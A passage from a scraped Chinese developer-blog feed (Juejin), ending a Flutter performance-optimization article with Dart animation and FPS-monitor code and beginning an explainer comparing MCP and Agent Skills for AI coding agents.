<li>避免在动画中调用setState</li>
<li>使用TweenAnimationBuilder</li>
<li>合理使用物理动画</li>
</ol>
<p><strong>怎么做</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimationOptimization</span> </span>{
  <span class="hljs-comment">// 1. 使用AnimatedBuilder避免不必要的重建</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedAnimation() {
    <span class="hljs-keyword">return</span> AnimatedBuilder(
      animation: _animationController,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Transform.rotate(
          angle: _animationController.value * <span class="hljs-number">2</span> * pi,
          child: child,
        );
      },
      child: <span class="hljs-keyword">const</span> Icon(Icons.refresh), 
    );
  }
  
  <span class="hljs-comment">// 2. 使用TweenAnimationBuilder动画</span>
  <span class="hljs-keyword">static</span> Widget buildTweenAnimation() {
    <span class="hljs-keyword">return</span> TweenAnimationBuilder&lt;<span class="hljs-built_in">double</span>&gt;(
      tween: Tween(begin: <span class="hljs-number">0</span>, end: <span class="hljs-number">1</span>),
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
      builder: (context, value, child) {
        <span class="hljs-keyword">return</span> Opacity(
          opacity: value,
          child: Transform.scale(scale: value, child: child),
        );
      },
      child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'淡入放大动画'</span>),
    );
  }
  
  <span class="hljs-comment">// 3. 优化物理动画</span>
  <span class="hljs-keyword">static</span> Widget buildPhysicsAnimation() {
    <span class="hljs-keyword">return</span> Draggable(
      feedback: Material(
        child: Container(
          width: <span class="hljs-number">100</span>,
          height: <span class="hljs-number">100</span>,
          color: Colors.blue.withOpacity(<span class="hljs-number">0.5</span>),
        ),
      ),
      childWhenDragging: Container(),
      child: Container(
        width: <span class="hljs-number">100</span>,
        height: <span class="hljs-number">100</span>,
        color: Colors.blue,
      ),
      feedbackOffset: Offset.zero,
    );
  }
}
</code></pre>
<h3 data-id="heading-24">五、性能监控</h3>
<h4 data-id="heading-25">工具链</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[性能监控工具链] --&gt; B[开发阶段]
    A --&gt; C[测试阶段]
    A --&gt; D[生产阶段]
    
    B --&gt; E[Flutter DevTools]
    B --&gt; F[Dart Observatory]
    B --&gt; G[性能覆盖层]
    
    C --&gt; H[自动化测试]
    C --&gt; I[性能测试]
    C --&gt; J[内存泄漏测试]
    
    D --&gt; K[APM集成]
    D --&gt; L[崩溃监控]
    D --&gt; M[用户行为分析]
</code></pre>
<h4 data-id="heading-26">工具使用</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 1. 性能覆盖层</span>
<span class="hljs-keyword">void</span> enablePerformanceOverlay() {
  runApp(
    MaterialApp(
      home: <span class="hljs-keyword">const</span> MyApp(),
      showPerformanceOverlay: <span class="hljs-keyword">true</span>, 
      
      <span class="hljs-comment">// 其他调试选项</span>
      checkerboardRasterCacheImages: <span class="hljs-keyword">true</span>,
      checkerboardOffscreenLayers: <span class="hljs-keyword">true</span>,
      showSemanticsDebugger: <span class="hljs-keyword">true</span>,
    ),
  );
}

<span class="hljs-comment">// 2. 自定义性能监控</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PerformanceMonitor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  
  <span class="hljs-keyword">const</span> PerformanceMonitor({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _PerformanceMonitorState createState() =&gt; _PerformanceMonitorState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_PerformanceMonitorState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">PerformanceMonitor</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">WidgetsBindingObserver</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">double</span>&gt; _frameTimes = [];
  <span class="hljs-built_in">double</span> _fps = <span class="hljs-number">0</span>;
  <span class="hljs-built_in">int</span> _droppedFrames = <span class="hljs-number">0</span>;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    WidgetsBinding.instance!.addObserver(<span class="hljs-keyword">this</span>);
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didChangeMetrics() {
    <span class="hljs-comment">// 监控帧率</span>
    SchedulerBinding.instance!.addPostFrameCallback((timeStamp) {
      _recordFrameTime(timeStamp);
    });
  }
  
  <span class="hljs-keyword">void</span> _recordFrameTime(<span class="hljs-built_in">Duration</span> timeStamp) {
    <span class="hljs-keyword">final</span> now = timeStamp.inMicroseconds / <span class="hljs-number">1000</span>;
    _frameTimes.add(now);
    
    <span class="hljs-comment">// 保留最近1秒的数据</span>
    <span class="hljs-keyword">final</span> oneSecondAgo = now - <span class="hljs-number">1000</span>;
    _frameTimes.removeWhere((time) =&gt; time &lt; oneSecondAgo);
    
    <span class="hljs-comment">// 计算FPS</span>
    <span class="hljs-keyword">if</span> (_frameTimes.length &gt;= <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">final</span> fps = (_frameTimes.length - <span class="hljs-number">1</span>) * <span class="hljs-number">1000</span> / 
                 (_frameTimes.last - _frameTimes.first);
      
      <span class="hljs-comment">// 计算掉帧</span>
      <span class="hljs-keyword">final</span> frameInterval = _frameTimes.last - 
                           _frameTimes[_frameTimes.length - <span class="hljs-number">2</span>];
      <span class="hljs-keyword">if</span> (frameInterval &gt; <span class="hljs-number">33.34</span>) { 
        _droppedFrames++;
      }
      
      setState(() {
        _fps = fps;
      });
    }
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Stack(
      children: [
        widget.child,
        <span class="hljs-keyword">if</span> (kDebugMode) <span class="hljs-comment">// 只在调试模式显示</span>
          Positioned(
            top: <span class="hljs-number">40</span>,
            right: <span class="hljs-number">10</span>,
            child: Container(
              padding: <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">8</span>),
              color: _getFPSColor(),
              child: Text(
                <span class="hljs-string">'FPS: <span class="hljs-subst">${_fps.toStringAsFixed(<span class="hljs-number">1</span>)}</span>\n'</span>
                <span class="hljs-string">'掉帧: <span class="hljs-subst">$_droppedFrames</span>'</span>,
                style: <span class="hljs-keyword">const</span> TextStyle(color: Colors.white),
              ),
            ),
          ),
      ],
    );
  }
  
  Color _getFPSColor() {
    <span class="hljs-keyword">if</span> (_fps &gt;= <span class="hljs-number">55</span>) <span class="hljs-keyword">return</span> Colors.green;
    <span class="hljs-keyword">if</span> (_fps &gt;= <span class="hljs-number">30</span>) <span class="hljs-keyword">return</span> Colors.orange;
    <span class="hljs-keyword">return</span> Colors.red;
  }
}
</code></pre>
<h3 data-id="heading-27">六、性能优化优先级</h3>
<p>基于影响范围和实施难度等多重因素，建议性能优化的优先级顺序如下：</p>





























































<table><thead><tr><th>优先级</th><th>优化方向</th><th>影响范围</th><th>实施难度</th><th>推荐工具</th></tr></thead><tbody><tr><td><strong>P0</strong></td><td>修复内存泄漏</td><td>整个应用</td><td>低</td><td>DevTools, LeakCanary</td></tr><tr><td><strong>P0</strong></td><td>优化启动时间</td><td>首次体验</td><td>中</td><td>Flutter Performance</td></tr><tr><td><strong>P1</strong></td><td>优化列表滚动</td><td>核心功能</td><td>中</td><td>Performance Overlay</td></tr><tr><td><strong>P1</strong></td><td>优化包体积</td><td>下载率</td><td>中</td><td>Analyze Size</td></tr><tr><td><strong>P2</strong></td><td>优化动画流畅度</td><td>用户体验</td><td>高</td><td>Flutter Inspector</td></tr><tr><td><strong>P2</strong></td><td>优化构建性能</td><td>开发体验</td><td>低</td><td>Dart Analyzer</td></tr><tr><td><strong>P3</strong></td><td>优化渲染管线</td><td>特定场景</td><td>高</td><td>Custom RenderObject</td></tr></tbody></table>
<h3 data-id="heading-28">总结</h3>
<p>至此性能优化的知识点就全部介绍完了，其核心：</p>
<ul>
<li>需要从架构设计阶段开始考虑</li>
<li>不同的应用场景需要不同的优化策略</li>
<li>数据驱动</li>
<li>所有优化都要服务于用户体验</li>
<li>性能优化是持续的过程</li>
</ul>
<p><strong>过早优化是万恶之源，但不优化是用户体验的灾难。</strong> 优化在于正确的时间，用正确的方法，优化正确的地方。</p>
<hr/>
<p><strong>如果觉得这篇文章有帮助，别忘了一键三连支持一下！有任何问题或建议，欢迎在评论区交流讨论！</strong>
<strong>转载请注明出处~~~</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[别搞混了！MCP 和 Agent Skill 到底有什么区别？]]></title>    <link>https://juejin.cn/post/7584057497205817387</link>    <guid>https://juejin.cn/post/7584057497205817387</guid>    <pubDate>2025-12-16T06:50:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584057497205817387" data-draft-id="7584057497205768235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="别搞混了！MCP 和 Agent Skill 到底有什么区别？"/> <meta itemprop="keywords" content="AIGC,AI编程,Agent"/> <meta itemprop="datePublished" content="2025-12-16T06:50:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            别搞混了！MCP 和 Agent Skill 到底有什么区别？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:50:42.000Z" title="Tue Dec 16 2025 06:50:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">MCP 与 Skill 深度对比：AI Agent 的两种扩展哲学</h2>
<p>用 AI Agent 工具（Claude Code、Cursor、Windsurf 等）的时候，经常会遇到两个概念：</p>
<ul>
<li>MCP（Model Context Protocol）</li>
<li>Skill（Agent Skill）</li>
</ul>
<p>它们看起来都是"扩展 AI 能力"的方式，但具体有什么区别？为什么需要两套机制？什么时候该用哪个？</p>
<p>这篇文章会从设计哲学、技术架构、使用场景三个维度，把这两个概念彻底讲清楚。</p>
<h3 data-id="heading-1">一句话区分</h3>
<p>先给个简单的定位：</p>
<blockquote>
<p><strong>MCP 解决"连接"问题：让 AI 能访问外部世界</strong>
<strong>Skill 解决"方法论"问题：教 AI 怎么做某类任务</strong></p>
</blockquote>
<p>用 Anthropic 官方的说法：</p>
<blockquote>
<p>"MCP connects Claude to external services and data sources. Skills provide procedural knowledge—instructions for how to complete specific tasks or workflows."</p>
</blockquote>
<p>打个比方：MCP 是 AI 的"手"（能触碰外部世界），Skill 是 AI 的"技能书"（知道怎么做某件事）。</p>
<p>你需要两者配合：MCP 让 AI 能连接数据库，Skill 教 AI 怎么分析查询结果。</p>
<h3 data-id="heading-2">MCP：AI 应用的 USB-C 接口</h3>
<h4 data-id="heading-3">MCP 是什么</h4>
<p>MCP（Model Context Protocol）是 Anthropic 在 2024 年 11 月发布的<strong>开源协议</strong>，用于标准化 AI 应用与外部系统的交互方式。</p>
<p>官方的比喻是"AI 应用的 USB-C 接口"——就像 USB-C 提供了一种通用的方式连接各种设备，MCP 提供了一种通用的方式连接各种工具和数据源。</p>
<p><strong>关键点：MCP 不是 Claude 专属的。</strong></p>
<p>它是一个开放协议，理论上任何 AI 应用都可以实现。截至 2025 年初，已经被多个平台采用：</p>
<ul>
<li><strong>Anthropic</strong>: Claude Desktop、Claude Code</li>
<li><strong>OpenAI</strong>: ChatGPT、Agents SDK、Responses API</li>
<li><strong>Google</strong>: Gemini SDK</li>
<li><strong>Microsoft</strong>: Azure AI Services</li>
<li><strong>开发工具</strong>: Zed、Replit、Codeium、Sourcegraph</li>
</ul>
<p>到 2025 年 2 月，已经有超过 1000 个开源 MCP 连接器。</p>
<h4 data-id="heading-4">MCP 的架构</h4>
<p>MCP 基于 <strong>JSON-RPC 2.0</strong> 协议，采用<strong>客户端-主机-服务器</strong>（Client-Host-Server）架构：</p>
<pre><code class="hljs language-scss" lang="scss">┌─────────────────────────────────────────────────────────┐
│                        Host                              │
│              (Claude Desktop / Cursor)                   │
│                                                          │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐      │
│  │   Client    │  │   Client    │  │   Client    │      │
│  │  (GitHub)   │  │ (Postgres)  │  │  (Sentry)   │      │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘      │
└─────────┼────────────────┼────────────────┼─────────────┘
          │                │                │
          ▼                ▼                ▼
    ┌───────────┐    ┌───────────┐    ┌───────────┐
    │MCP Server │    │MCP Server │    │MCP Server │
    │ (GitHub)  │    │(Postgres) │    │ (Sentry)  │
    └───────────┘    └───────────┘    └───────────┘
</code></pre>
<ul>
<li><strong>Host</strong>：用户直接交互的应用（Claude Desktop、Cursor、Windsurf）</li>
<li><strong>Client</strong>：Host 应用中管理与特定 Server 通信的组件</li>
<li><strong>Server</strong>：连接外部系统的桥梁（数据库、API、本地文件等）</li>
</ul>
<h4 data-id="heading-5">MCP 的三个核心原语</h4>
<p>MCP 定义了三种 Server 可以暴露的原语：</p>
<h5 data-id="heading-6">1. Tools（工具）—— 模型控制</h5>
<p>可执行的函数，AI 可以调用来执行操作。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"query_database"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Execute SQL query on the database"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"parameters"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"sql"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span> <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>AI 决定什么时候调用这些工具。比如用户问"这个月的收入是多少"，AI 判断需要查数据库，就会调用 <code>query_database</code> 工具。</p>
<h5 data-id="heading-7">2. Resources（资源）—— 应用控制</h5>
<p>数据源，为 AI 提供上下文信息。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"uri"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"file:///Users/project/README.md"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Project README"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"mimeType"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text/markdown"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>资源由应用控制何时加载。用户可以通过 <code>@</code> 引用资源，类似于引用文件。</p>
<h5 data-id="heading-8">3. Prompts（提示）—— 用户控制</h5>
<p>预定义的提示模板，帮助结构化与 AI 的交互。</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code_review"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Review code for bugs and security issues"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"arguments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span> <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"code"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>用户显式触发这些提示，类似于 Slash Command。</p>
<h4 data-id="heading-9">MCP 与 Function Calling 的关系</h4>
<p>很多人会问：MCP 和 OpenAI 的 Function Calling、Anthropic 的 Tool Use 有什么区别？</p>
<p><strong>Function Calling</strong> 是 LLM 的能力——把自然语言转换成结构化的函数调用请求。LLM 本身<strong>不执行</strong>函数，只是告诉你"应该调用什么函数，参数是什么"。</p>
<p><strong>MCP</strong> 是在 Function Calling 之上的<strong>协议层</strong>——它标准化了"函数在哪里、怎么调用、怎么发现"。</p>
<p>两者的关系：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">用户输入 → LLM (<span class="hljs-keyword">Function</span> Calling) → <span class="hljs-string">"需要调用 query_database"</span>
                                           ↓
                                    MCP Protocol
                                           ↓
                                    MCP <span class="hljs-built_in">Server</span> 执行
                                           ↓
                                    返回结果给 LLM
</code></pre>
<p><strong>Function Calling 解决"决定做什么"，MCP 解决"怎么做到"。</strong></p>
<h4 data-id="heading-10">MCP 的传输方式</h4>
<p>MCP 支持两种主要的传输方式：</p>




















<table><thead><tr><th>传输方式</th><th>适用场景</th><th>说明</th></tr></thead><tbody><tr><td><strong>Stdio</strong></td><td>本地进程</td><td>Server 在本地机器运行，适合需要系统级访问的工具</td></tr><tr><td><strong>HTTP/SSE</strong></td><td>远程服务</td><td>Server 在远程运行，适合云服务（GitHub、Sentry、Notion）</td></tr></tbody></table>
<p>大部分云服务用 HTTP，本地脚本和自定义工具用 Stdio。</p>
<h4 data-id="heading-11">MCP 的代价</h4>
<p>MCP 不是免费的午餐，它有明显的成本：</p>
<p><strong>1. Token 消耗大</strong></p>
<p>每个 MCP Server 都会占用上下文空间。每次对话开始，MCP Client 需要告诉 LLM "你有这些工具可用"，这些工具定义会消耗大量 Token。</p>
<p>连接多个 MCP Server 后，光是工具定义可能就占用了上下文窗口的很大一部分。社区观察到：</p>
<blockquote>
<p>"We're seeing a lot of MCP developers even at enterprise build MCP servers that expose way too much, consuming the entire context window and leading to hallucination."</p>
</blockquote>
<p><strong>2. 需要维护连接</strong></p>
<p>MCP Server 是持久连接的外部进程。Server 挂了、网络断了、认证过期了，都会影响 AI 的能力。</p>
<p><strong>3. 安全风险</strong></p>
<p>Anthropic 官方警告：</p>
<blockquote>
<p>"Use third party MCP servers at your own risk - Anthropic has not verified the correctness or security of all these servers."</p>
</blockquote>
<p>特别是能获取外部内容的 MCP Server（比如网页抓取），可能带来 prompt injection 风险。</p>
<h4 data-id="heading-12">MCP 的价值</h4>
<p>尽管有这些代价，MCP 的价值在于<strong>标准化和可复用性</strong>：</p>
<ul>
<li><strong>一次实现，到处使用</strong>：同一个 GitHub MCP Server 可以在 Claude Desktop、Cursor、Windsurf 中使用</li>
<li><strong>动态发现</strong>：AI 可以在运行时发现有哪些工具可用，而不是写死在代码里</li>
<li><strong>供应商无关</strong>：不依赖特定的 LLM 提供商</li>
</ul>
<h3 data-id="heading-13">Skill：上下文工程的渐进式公开</h3>
<h4 data-id="heading-14">Skill 是什么</h4>
<p>Skill（全称 Agent Skill）是 Anthropic 在 2025 年 10 月发布的特性。官方定义：</p>
<blockquote>
<p>"Skills are organized folders of instructions, scripts, and resources that agents can discover and load dynamically to perform better at specific tasks."</p>
</blockquote>
<p>翻译一下：Skill 是一个文件夹，里面放着指令、脚本和资源，AI 会根据需要自动发现和加载。</p>
<p><strong>Skill 在架构层级上和 MCP 不同。</strong></p>
<p>用 Anthropic 的话说：</p>
<blockquote>
<p>"Skills are at the prompt/knowledge layer, whereas MCP is at the integration layer."</p>
</blockquote>
<p>Skill 是"提示/知识层"，MCP 是"集成层"。两者解决不同层面的问题。</p>
<h4 data-id="heading-15">Skill 的核心设计：渐进式信息公开</h4>
<p>Skill 最精妙的设计是<strong>渐进式信息公开</strong>（Progressive Disclosure）。这是 Anthropic 在上下文工程（Context Engineering）领域的重要实践。</p>
<p>官方的比喻：</p>
<blockquote>
<p>"Like a well-organized manual that starts with a table of contents, then specific chapters, and finally a detailed appendix."</p>
</blockquote>
<p>就像一本组织良好的手册：先看目录，再翻到相关章节，最后查阅附录。</p>
<p>Skill 分三层加载：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    subgraph L1["第 1 层：元数据（始终加载）"]
        A[Skill 名称 + 描述]
        B["约 100 tokens"]
    end

    subgraph L2["第 2 层：核心指令（按需加载）"]
        C[SKILL.md 完整内容]
        D["通常 &lt; 5k tokens"]
    end

    subgraph L3["第 3+ 层：支持文件（深度按需）"]
        E[reference.md]
        F[scripts/helper.py]
        G[templates/...]
    end

    L1 --&gt; |"Claude 判断相关"| L2
    L2 --&gt; |"需要更多信息"| L3

    style L1 fill:#d4edda,stroke:#28a745
    style L2 fill:#fff3cd,stroke:#ffc107
    style L3 fill:#cce5ff,stroke:#0d6efd
</code></pre>
<p><strong>这个设计的好处是什么？</strong></p>
<p>传统方式（比如 MCP）在会话开始时就把所有信息加载到上下文。如果你有 10 个 MCP Server，每个暴露 5 个工具，那就是 50 个工具定义——可能消耗数千甚至上万 Token。</p>
<p>Skill 的渐进式加载让你可以有几十个 Skill，但同时只加载一两个。<strong>上下文效率大幅提升。</strong></p>
<p>用官方的话说：</p>
<blockquote>
<p>"This means that the amount of context that can be bundled into a skill is effectively unbounded."</p>
</blockquote>
<p>理论上，单个 Skill 可以包含无限量的知识——因为只有需要的部分才会被加载。</p>
<h4 data-id="heading-16">上下文工程：Skill 背后的思想</h4>
<p>Skill 是 Anthropic "上下文工程"（Context Engineering）理念的产物。官方对此有专门的阐述：</p>
<blockquote>
<p>"At Anthropic, we view context engineering as the natural progression of prompt engineering. Prompt engineering refers to methods for writing and organizing LLM instructions for optimal outcomes. Context engineering refers to the set of strategies for curating and maintaining the optimal set of tokens (information) during LLM inference."</p>
</blockquote>
<p>简单说：</p>
<ul>
<li><strong>Prompt Engineering</strong>：怎么写好提示词</li>
<li><strong>Context Engineering</strong>：怎么管理上下文窗口里的信息</li>
</ul>
<p>LLM 的上下文窗口是有限的（即使是 200k 窗口，也会被大量信息撑爆）。Context Engineering 的核心问题是：<strong>在有限的窗口里，放什么信息能让 AI 表现最好？</strong></p>
<p>Skill 的渐进式加载就是 Context Engineering 的具体实践——只加载当前任务需要的信息，让每一个 Token 都发挥最大价值。</p>
<h4 data-id="heading-17">Skill 的触发机制</h4>
<p>Skill 是<strong>自动触发</strong>的，这是它和 Slash Command 的关键区别。</p>
<p>工作流程：</p>
<ol>
<li><strong>扫描阶段</strong>：Claude 读取所有 Skill 的元数据（名称 + 描述）</li>
<li><strong>匹配阶段</strong>：将用户请求与 Skill 描述进行语义匹配</li>
<li><strong>加载阶段</strong>：如果匹配成功，加载完整的 SKILL.md</li>
<li><strong>执行阶段</strong>：按照 Skill 里的指令执行任务，按需加载支持文件</li>
</ol>
<p>用户不需要显式调用。比如你有一个 <code>code-review</code> Skill，用户说"帮我 review 这段代码"，Claude 会自动匹配并加载。</p>
<p><strong>Skill 的本质是什么？</strong></p>
